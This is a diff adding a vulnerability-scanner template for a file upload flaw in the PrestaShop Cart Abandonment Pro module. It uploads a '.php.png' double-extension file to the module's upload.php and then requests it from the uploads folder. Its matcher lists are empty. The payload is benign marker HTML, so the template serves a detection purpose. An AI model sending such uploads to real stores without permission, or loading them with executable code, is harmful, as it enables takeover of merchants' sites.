@@ -1,0 +1,33 @@
+id: prestashop-cartabandonmentpro-file-upload
+brief:
+    title: Prestashop Cart Abandonment Pro File Upload
+    by: MaStErChO
+    level: critical
+    about: ""
+    label:
+        - intrusive
+        - file-upload
+        - cartabandonmentpro
+        - prestashop
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/modules/{{paths}}/upload.php'
+      head:
+        Content-Type: multipart/form-data; boundary=xYzZY
+      body: |-
+        --xYzZY
+        Content-Disposition: form-data; name="image"; filename="{{filename}}.php.png"
+        Content-Type: image/png
+
+        <html>
+        <!-- {{string}} -->
+        </html>
+
+        --xYzZY--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}{{matched_path}}uploads/{{filename}}.php.png'
+      signs: []
